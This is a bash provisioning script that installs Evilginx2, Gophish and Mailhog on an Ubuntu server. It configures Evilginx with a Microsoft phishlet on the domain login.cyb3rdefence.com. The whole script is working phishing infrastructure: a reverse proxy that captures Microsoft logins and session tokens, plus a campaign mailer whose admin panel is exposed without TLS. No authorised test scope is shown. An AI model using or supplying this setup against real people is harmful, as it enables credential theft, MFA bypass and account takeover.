#!/bin/bash
# ==== Evilginx2 v3.3.0 + Gophish + Mailhog Setup Script (Ubuntu 20.04, Vultr) ====

set -e

# ==== Variables ====
DOMAIN="login.cyb3rdefence.com"
STATIC_DOMAIN="static.cyb3rdefence.com"
EMAIL="admin@$DOMAIN"
GOPHISH_PORT=8800
MAILHOG_PORT=8025
GOPHISH_USER="admin"
GOPHISH_PASS="$(openssl rand -hex 12)"

# ==== Update & Install Base Packages ====
apt update && apt upgrade -y
apt install -y git make curl unzip ufw build-essential ca-certificates gnupg lsb-release libcap2-bin

# ==== Install Go 1.22.3 ====
GO_VERSION="1.22.3"
cd /tmp
curl -LO https://go.dev/dl/go$GO_VERSION.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go$GO_VERSION.linux-amd64.tar.gz

# Add Go to PATH permanently
echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
chmod +x /etc/profile.d/go.sh
export PATH=$PATH:/usr/local/go/bin

# ==== Install Evilginx2 v3.3.0 ====
cd /opt
git clone --branch v3.3.0 https://github.com/kgretzky/evilginx2.git
cd evilginx2
make build
setcap cap_net_bind_service=+ep /opt/evilginx2/dist/evilginx

# ==== Evilginx2 Auto Config ====
cat <<EOF > /root/evilginx2_autosetup.txt
config domain $DOMAIN
config ip $(curl -s ifconfig.me)
config redirect_url https://login.microsoftonline.com/
config autocert on
phishlets hostname microsoft $DOMAIN
phishlets enable microsoft
EOF

# ==== Install Gophish ====
cd /opt
curl -LO https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish
sed -i "s/\"admin_server\":.*/\"admin_server\": \"0.0.0.0:$GOPHISH_PORT\",/" config.json
sed -i "s/\"use_tls\": true/\"use_tls\": false/" config.json

# ==== Store Gophish Credentials ====
echo -e "Gophish Login:\nUser: $GOPHISH_USER\nPass: $GOPHISH_PASS" > /root/gophish-credentials.txt

# ==== Install Mailhog ====
wget -O /usr/local/bin/mailhog https://github.com/mailhog/MailHog/releases/download/v1.0.1/MailHog_linux_amd64
chmod +x /usr/local/bin/mailhog

# ==== Setup UFW Firewall ====
ufw allow 22
ufw allow 80
ufw allow 443
ufw allow $GOPHISH_PORT
ufw allow $MAILHOG_PORT
ufw --force enable

# ==== Start Services ====
cat <<EOF > /etc/systemd/system/gophish.service
[Unit]
Description=Gophish Phishing Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/gophish
ExecStart=/opt/gophish/gophish
Restart=always

[Install]
WantedBy=multi-user.target
EOF

cat <<EOF > /etc/systemd/system/mailhog.service
[Unit]
Description=Mailhog Service
After=network.target

[Service]
ExecStart=/usr/local/bin/mailhog -api-bind-addr=0.0.0.0:$MAILHOG_PORT -ui-bind-addr=0.0.0.0:$MAILHOG_PORT
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable --now gophish mailhog

# ==== Done ====
echo "\n Setup Complete!"
echo "Evilginx path: /opt/evilginx2/dist/evilginx"
echo "Run it manually: /opt/evilginx2/dist/evilginx"
echo "Auto setup commands in: /root/evilginx2_autosetup.txt"
echo "Gophish UI: http://$(curl -s ifconfig.me):$GOPHISH_PORT"
echo "Mailhog UI: http://$(curl -s ifconfig.me):$MAILHOG_PORT"
echo "Gophish credentials saved in /root/gophish-credentials.txt"
echo " Remember to run Evilginx interactively to load phishlets."
